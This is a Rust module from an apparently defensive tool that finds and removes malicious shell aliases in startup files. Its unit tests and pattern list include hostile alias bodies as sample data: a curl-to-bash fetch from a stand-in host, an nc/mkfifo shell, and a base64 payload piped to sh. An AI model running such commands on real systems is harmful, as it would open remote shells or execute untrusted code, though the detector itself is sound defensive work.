//! Malicious shell aliases that shadow or override system commands.
//!
//! An attacker who can write to a shell startup file can make dangerous
//! operations appear safe to an operator by aliasing tools like `sudo`, `ssh`,
//! or `ls` to versions that silently exfiltrate credentials or spawn a reverse
//! shell while still performing the expected action. This module finds and
//! removes such aliases from both system-wide and per-user configuration files.
//!
//! Three tiers of severity:
//!
//! - **Critical**: any redefinition of a security-sensitive command (`sudo`,
//!   `ssh`, `passwd`, …) regardless of what the alias does.
//! - **High**: an alias whose command body contains suspicious patterns (fetch,
//!   execute from `/tmp`, reverse-shell indicators, etc.).
//! - **Medium**: an alias that overrides a common administrative tool (`ls`,
//!   `ps`, `systemctl`, …) with content that looks clean but is still worth
//!   reviewing.

use std::path::{Path, PathBuf};

use crate::core::{
    DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_accounts,
    require_root,
};
use crate::core::scan::{effective_line, suspicious_matches};

/// System-wide files that may contain `alias` definitions.
const SYSTEM_ALIAS_FILES: &[&str] = &[
    "/etc/profile",
    "/etc/bash.bashrc",
    "/etc/bashrc",
    "/etc/zshrc",
    "/etc/zsh/zshrc",
];

/// Drop-in directory sourced by `/etc/profile`.
const SYSTEM_PROFILE_D: &str = "/etc/profile.d";

/// Per-user files (relative to home) that may contain aliases.
const USER_ALIAS_FILES: &[&str] = &[
    ".bashrc",
    ".bash_aliases",
    ".bash_profile",
    ".zshrc",
    ".profile",
];

/// Commands that control authentication and authorisation.
/// Any alias of these — regardless of content — is Critical.
const SECURITY_COMMANDS: &[&str] = &["sudo", "su", "passwd", "ssh", "scp"];

/// Commands defenders and operators depend on during incident response.
/// Overriding these warrants a Medium finding when the content looks clean.
const COMMON_COMMANDS: &[&str] = &[
    "git", "python", "python3", "pip", "apt", "yum", "dnf", "systemctl",
    "iptables", "nft", "chmod", "chown", "rm", "mv", "cp", "ls", "ps",
    "netstat", "ss", "id", "whoami",
];

/// Extra patterns relevant in alias command bodies but not caught by the shared
/// scanner (which focuses on shell-expansion and exec patterns).
const ALIAS_EXTRA: &[&str] = &[
    "/tmp/",
    "/dev/shm/",
    "nc ",
    "mkfifo",
    "exec ",
];

/// Scan system-wide and per-user shell config files for malicious aliases.
pub fn run(ctx: &DefenderContext) -> Result {
    if require_root().is_err() {
        ctx.emit(Finding::new(
            Severity::Medium,
            "shell_aliases",
            "Not running as root — shell alias check skipped",
            "Run as root to review system-wide and user shell configuration files.",
        ));
        return Err(DefenderError::NotRoot);
    }

    ctx.log_msg("[+] Checking shell aliases...");

    let mut targets: Vec<PathBuf> = SYSTEM_ALIAS_FILES.iter().map(PathBuf::from).collect();

    // /etc/profile.d/*.sh
    if let Ok(entries) = std::fs::read_dir(SYSTEM_PROFILE_D) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_file() && p.extension().map(|e| e == "sh").unwrap_or(false) {
                targets.push(p);
            }
        }
    }

    // Per-user dotfiles (login-capable accounts only)
    if let Ok(accounts) = collect_accounts() {
        for account in accounts.iter().filter(|a| a.can_log_in()) {
            for f in USER_ALIAS_FILES {
                targets.push(account.home.join(f));
            }
        }
    }

    for target in &targets {
        if target.is_file() {
            scan_file_for_aliases(ctx, target);
        }
    }

    ctx.log_msg("[✓] Shell alias check complete");
    Ok(())
}

// ── Per-file scanner ──────────────────────────────────────────────────────────

fn scan_file_for_aliases(ctx: &DefenderContext, path: &Path) {
    let Ok(contents) = std::fs::read_to_string(path) else {
        return;
    };

    for raw_line in contents.lines() {
        let Some(line) = effective_line(raw_line) else {
            continue;
        };

        // Only process alias definitions.
        if !line.starts_with("alias ") {
            continue;
        }

        let alias_name = match parse_alias_name(line) {
            Some(n) => n.to_string(),
            None => continue,
        };

        // The command value is everything after the first '='.
        let command_part = line
            .find('=')
            .map(|p| &line[p + 1..])
            .unwrap_or("");

        let (severity, reason) = classify_alias(&alias_name, line, command_part);

        let severity = match severity {
            Some(s) => s,
            None => continue, // benign alias
        };

        ctx.log_msg(&format!(
            "[!] {} alias in {}: {}",
            severity.label(),
            path.display(),
            line
        ));
        ctx.log_evidence_line(&path.display().to_string(), line);

        let removed = ctx.remove_line_from_file_logged(path, line);

        ctx.emit(
            Finding::new(
                severity,
                "shell_aliases",
                format!(
                    "Malicious alias {} in {} (removed: {}): alias {}",
                    if removed { "REMOVED" } else { "FOUND" },
                    path.display(),
                    removed,
                    alias_name,
                ),
                format!(
                    "file: {}\nline: {}\nreason: {}\nremoved: {}",
                    path.display(),
                    line,
                    reason,
                    removed,
                ),
            )
            .with_path(path.to_path_buf())
            .with_context("alias", alias_name.clone())
            .with_context("reason", reason.clone())
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed { Verdict::Remove } else { Verdict::Investigate },
                if removed {
                    format!(
                        "The malicious alias definition for '{}' was automatically removed \
                         from {}. Evidence and proof of removal logged.",
                        alias_name,
                        path.display()
                    )
                } else {
                    format!(
                        "Could not auto-remove alias '{}' from {} — edit the file \
                         manually and delete the flagged line.",
                        alias_name,
                        path.display()
                    )
                },
            ),
        );
    }
}

// ── Classification helpers ────────────────────────────────────────────────────

/// Decide the severity and reason for an alias line, or `None` if benign.
fn classify_alias(name: &str, line: &str, command_part: &str) -> (Option<Severity>, String) {
    // Critical: any alias of a security-critical command.
    if is_security_command(name) {
        return (
            Some(Severity::Critical),
            format!(
                "alias overrides security-critical command '{}': {}",
                name, command_part
            ),
        );
    }

    // High: alias body contains suspicious patterns.
    let suspicious = suspicious_matches(command_part);
    let has_extra = ALIAS_EXTRA
        .iter()
        .any(|pat| command_part.to_lowercase().contains(pat));

    if !suspicious.is_empty() || has_extra {
        let all_reasons = if suspicious.is_empty() {
            "suspicious path/command".to_string()
        } else {
            suspicious.join(", ")
        };
        return (
            Some(Severity::High),
            format!(
                "alias command contains suspicious pattern [{}]: {}",
                all_reasons, command_part
            ),
        );
    }

    // Medium: alias overrides a common tool with apparently-clean content.
    if is_common_command(name) {
        return (
            Some(Severity::Medium),
            format!(
                "alias overrides common command '{}': {}",
                name, line
            ),
        );
    }

    (None, String::new())
}

/// Extract the command name from a line like `alias foo='bar'`.
///
/// Returns the trimmed name (the part before `=`), or `None` if the line is not
/// a well-formed alias definition.
pub fn parse_alias_name(line: &str) -> Option<&str> {
    let rest = line.strip_prefix("alias ")?;
    let eq_pos = rest.find('=')?;
    Some(rest[..eq_pos].trim())
}

pub fn is_security_command(name: &str) -> bool {
    SECURITY_COMMANDS.contains(&name)
}

pub fn is_common_command(name: &str) -> bool {
    COMMON_COMMANDS.contains(&name)
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // parse_alias_name

    #[test]
    fn parse_simple_alias() {
        assert_eq!(parse_alias_name("alias ll='ls -la'"), Some("ll"));
        assert_eq!(parse_alias_name("alias grep='grep --color=auto'"), Some("grep"));
    }

    #[test]
    fn parse_alias_security_command() {
        assert_eq!(parse_alias_name("alias sudo='sudo -E bash'"), Some("sudo"));
        assert_eq!(parse_alias_name("alias ssh='ssh -o StrictHostKeyChecking=no'"), Some("ssh"));
    }

    #[test]
    fn parse_alias_trims_whitespace_around_name() {
        // "alias  foo = 'bar'" — extra spaces around the name and '='
        assert_eq!(parse_alias_name("alias  foo = 'bar'"), Some("foo"));
    }

    #[test]
    fn parse_alias_no_equals_returns_none() {
        assert!(parse_alias_name("alias foo").is_none());
    }

    #[test]
    fn parse_non_alias_line_returns_none() {
        assert!(parse_alias_name("export PATH=$PATH:/usr/local/bin").is_none());
        assert!(parse_alias_name("source ~/.bashrc").is_none());
        assert!(parse_alias_name("# alias sudo='evil'").is_none());
    }

    // is_security_command / is_common_command

    #[test]
    fn security_commands_recognised() {
        for cmd in &["sudo", "su", "passwd", "ssh", "scp"] {
            assert!(is_security_command(cmd), "{} should be security", cmd);
        }
    }

    #[test]
    fn security_commands_not_in_common() {
        for cmd in &["sudo", "su", "passwd"] {
            assert!(!is_common_command(cmd), "{} should not be common", cmd);
        }
    }

    #[test]
    fn common_commands_recognised() {
        for cmd in &["ls", "ps", "id", "systemctl", "git", "rm"] {
            assert!(is_common_command(cmd), "{} should be common", cmd);
        }
    }

    #[test]
    fn benign_alias_name_not_flagged() {
        assert!(!is_security_command("ll"));
        assert!(!is_common_command("ll"));
        assert!(!is_security_command("glog"));
        assert!(!is_common_command("glog"));
    }

    // classify_alias

    #[test]
    fn sudo_alias_any_content_is_critical() {
        let (sev, _) = classify_alias("sudo", "alias sudo='sudo -E bash'", "'sudo -E bash'");
        assert_eq!(sev, Some(Severity::Critical));
    }

    #[test]
    fn ssh_alias_any_content_is_critical() {
        let (sev, _) = classify_alias("ssh", "alias ssh='/usr/bin/ssh'", "'/usr/bin/ssh'");
        assert_eq!(sev, Some(Severity::Critical));
    }

    #[test]
    fn alias_with_tmp_payload_is_high() {
        let (sev, reason) = classify_alias(
            "ll",
            "alias ll='ls -la; /tmp/.backdoor &'",
            "'ls -la; /tmp/.backdoor &'",
        );
        assert_eq!(sev, Some(Severity::High));
        assert!(reason.contains("suspicious") || reason.contains("/tmp/"));
    }

    #[test]
    fn alias_with_curl_pipe_is_high() {
        let (sev, _) = classify_alias(
            "update",
            "alias update='curl http://evil.test/x | bash'",
            "'curl http://evil.test/x | bash'",
        );
        assert_eq!(sev, Some(Severity::High));
    }

    #[test]
    fn ls_with_clean_content_is_medium() {
        let (sev, _) = classify_alias("ls", "alias ls='ls --color=auto'", "'ls --color=auto'");
        assert_eq!(sev, Some(Severity::Medium));
    }

    #[test]
    fn benign_shortcut_alias_is_none() {
        let (sev, _) = classify_alias("ll", "alias ll='ls -la'", "'ls -la'");
        assert_eq!(sev, None);
    }

    #[test]
    fn mkfifo_in_alias_is_high() {
        let (sev, _) = classify_alias(
            "netwatch",
            "alias netwatch='mkfifo /tmp/f; nc -l 4444 < /tmp/f | sh > /tmp/f'",
            "'mkfifo /tmp/f; nc -l 4444 < /tmp/f | sh > /tmp/f'",
        );
        assert_eq!(sev, Some(Severity::High));
    }

    #[test]
    fn base64_decode_in_alias_is_high() {
        let (sev, _) = classify_alias(
            "refresh",
            "alias refresh='echo cGF5bG9hZA== | base64 -d | sh'",
            "'echo cGF5bG9hZA== | base64 -d | sh'",
        );
        assert_eq!(sev, Some(Severity::High));
    }
}
